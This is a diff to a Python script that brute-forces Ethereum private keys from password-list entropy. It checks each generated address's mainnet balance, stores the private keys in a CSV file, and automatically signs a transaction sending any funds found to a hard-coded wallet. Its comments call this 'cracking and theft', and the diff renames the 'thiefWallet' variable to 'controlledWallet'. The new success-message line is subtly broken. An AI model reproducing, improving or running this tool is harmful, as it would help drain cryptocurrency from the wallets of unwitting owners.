@@ -20,6 +20,9 @@
 #	Profit
 #
 # Project TODOs:
+#	Add more comprehensive permutations
+#		main(), tempLine > maxByteLength - do every maxByteLength-length permutation of tempLine
+#		main(), maxByteLength else - do every permutation of padding (1L-255R, 2L-254R, 3L-253R, etc)
 #	Prompt user to change variable settings upon first running of the program
 #	Verbosity setting
 # 	Better error handling for web3 calls
@@ -34,30 +37,48 @@
 import sys, csv, eth_utils
 from web3 import Web3
 from eth_account.account import Account
-from sys import getsizeof # TODO: why can't we just 'import sys'?
+from sys import getsizeof # Why can't we just 'import sys'?
 
 __author__ = "Mark Rudnitsky"
 __copyright__ = "(C)2022 Mark Rudnitsky"
 __credits__ = ["Mark Rudnitsky"]
 __license__ = "GPLv3"
-__version__ = "1.0"
+__version__ = "1.1"
 __maintainer__ = "Mark Rudnitsky"
 __status__ = "Prototype"
 
-### CHANGE THESE ASAP ###
-keygenFile = "rockyou.txt" # For entropy
-dictFileName = "generated-keypairs.csv" # Database for generated keypairs
-thiefWallet = "0x2e2b43E20FCFC44D4cfCB16A723270c7a0Bc914F" # Transfer any found funds here
-# Transaction fee details
-maxGasPerTx = 0 # Max gas we're willing to pay to make our transaction go through; 0 = set the gas price dyamically based on market conditions
-marginOfSafety = 20 # Percent above fee market rate we wnt to be at, high is more guarantee your tx will be included in the next block
-gasCost = 21000 # Keep constant unless you know what you're doing
-preferredPriorityFee = 4 # Current values: https://ethgasstation.info, https://etherscan.io/gastracker
-# API Details
-infuraKey = "UPDATE_TO_YOUR_OWN_API_KEY" # ETH mainnet API access through Infura
-connectionUrl = "https://mainnet.infura.io/v3/" + infuraKey # Infura HTTPS API
-#connectionUrl = "wss://mainnet.infura.io/ws/v3/" + infuraKey # Infura Websockets API
-### END CHANGE THESE ASAP ###
+##### CHANGE THESE ASAP #####
+#
+# Entropy source (rockyou.txt or other password list is a good place to start)
+keygenFile = "rockyou.txt"
+# Filename of database for generated keypairs
+dictFileName = "generated-keypairs.csv"
+# The wallet we want to transfer found Ether to
+controlledWallet = "0x2e2b43E20FCFC44D4cfCB16A723270c7a0Bc914F"
+#
+### Transaction fee details ###
+#
+# Max gas we're willing to pay to make our transaction go through; 
+# 0 = set the gas price dyamically based on market conditions
+maxGasPerTx = 0
+# Percent above fee market rate we wnt to be at, 0-100
+# Setting this higher is more guarantee your transaction will be included in the next block
+marginOfSafety = 0
+# Keep 'gasCost' constant unless you know what you're doing
+gasCost = 21000
+# To get current values for 'preferredPriorityFee': https://ethgasstation.info, https://etherscan.io/gastracker
+preferredPriorityFee = 4
+#
+### API Details ###
+#
+# Ethereum mainnet API access through Infura
+infuraKey = "UPDATE_TO_YOUR_OWN_API_KEY"
+# Infura HTTPS API
+connectionUrl = "https://mainnet.infura.io/v3/" + infuraKey 
+# Infura Websockets API, uncomment if preferred
+#connectionUrl = "wss://mainnet.infura.io/ws/v3/" + infuraKey
+#
+##### END CHANGE THESE ASAP #####
 
 # Connect to the APIs so we can interact with the Ethereum blockchian
 if (connectionUrl.startswith('wss')): # Websockets
@@ -74,12 +95,14 @@ def generateAddress(entropy):
 	tempAcct = Account.create(extra_entropy=entropy)
 	pubKey = tempAcct.address # Public key/address
 	privKey = tempAcct.key # Private key
-	#privKey = encode_hex(tempAcct.key) # Usually won't work with Metamask &c but is human readable
+	# The below line means the private key stored in our can't always be imported into common wallets like Metamask.
+	# However, it is actually human readable. Uncomment the line if you'd prefer that.
+	#privKey = encode_hex(privKey)
 	return pubKey, privKey
 
 # Roll reporting into one function
 def reporting(pubKey, privKey, balance):
-	#header = ['Ether Wallet Public Key', 'Ether Wallet Private Key', 'ETH Balance']
+	#header = ['Ether Wallet Public Key', 'Ether Wallet Private Key', 'ETH Balance in Wei']
 	data = [pubKey, privKey, balance]
 	with open(dictFileName, 'a+', encoding='UTF8', newline='') as dictionaryFile:
 		writer = csv.writer(dictionaryFile)
@@ -87,20 +110,19 @@ def reporting(pubKey, privKey, balance):
 
 # The actual cracking and theft
 def findANonZeroBalance(entropy):
-	#print(str(entropy))
 	# Create a wallet
 	pubKey, privKey = generateAddress(entropy)
-
-	nonce = web3.eth.getTransactionCount(pubKey, 'latest')
 	balance = web3.eth.getBalance(pubKey) # Balance in wei
-	#print(web3.fromWei(balance, "ether"))
+	#balance = web3.fromWei(balance, "ether") # Balance in Ether
 	
 	# Save relevant data
 	reporting(pubKey, privKey, balance)
 
 	# Jackpot
-	if (balance > 0): # 1 in 2^256 chance this condition is true		
-		# Calculate gas costs (london fork and EIP-1559 compliant)
+	if (balance > 0): # 1 in 2^256 chance this condition is true	
+		nonce = web3.eth.getTransactionCount(pubKey, 'latest')
+		
+		# Calculate gas costs (EIP-1559 compliant)
 		baseFee = int(maxGasPerTx)
 		if not baseFee:
 			baseFee = web3.eth.getBlock("pending").baseFeePerGas
@@ -112,7 +134,7 @@ def findANonZeroBalance(entropy):
 		tx = {
 			'from': pubKey,
 			'nonce': nonce,
-			'to': thiefWallet,
+			'to': controlledWallet,
 			'value': balance,
 			'gas': gasCost,
 			'maxFeePerGas': maxFee,
@@ -121,7 +143,7 @@ def findANonZeroBalance(entropy):
 
 		signed_tx = web3.eth.account.signTransaction(tx, privKey)
 		tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
-		#print(web3.toHex(tx_hash))	
+		print("[SUCCESS] " + web3.fromWei(balance, "ether") + " Ether transferred from " + pubKey + " to us in tx " + web3.toHex(tx_hash))
 
 # Main function
 def main():
@@ -141,7 +163,6 @@ def main():
 		# Only allowed keylengths are defined in BIP39 
 		for maxByteLength in [128, 160, 192, 224, 256]:
 			# Too long, just use the first or last maxByteLength bytes
-			# TODO: Potentially do every maxByteLength-length permutation of tempLine?
 			if (tempLineByteLength > maxByteLength):
 				# First maxByteLength bytes
 				findANonZeroBalance(tempLine[:maxByteLength])
@@ -155,7 +176,6 @@ def main():
 
 			# Proper length entropy
 			else:
-				# TODO: Do every permutation of padding (1L-255R, 2L-254R, 3L-253R, etc)
 				pad = maxByteLength - tempLineByteLength
 
 				# Pad on the left
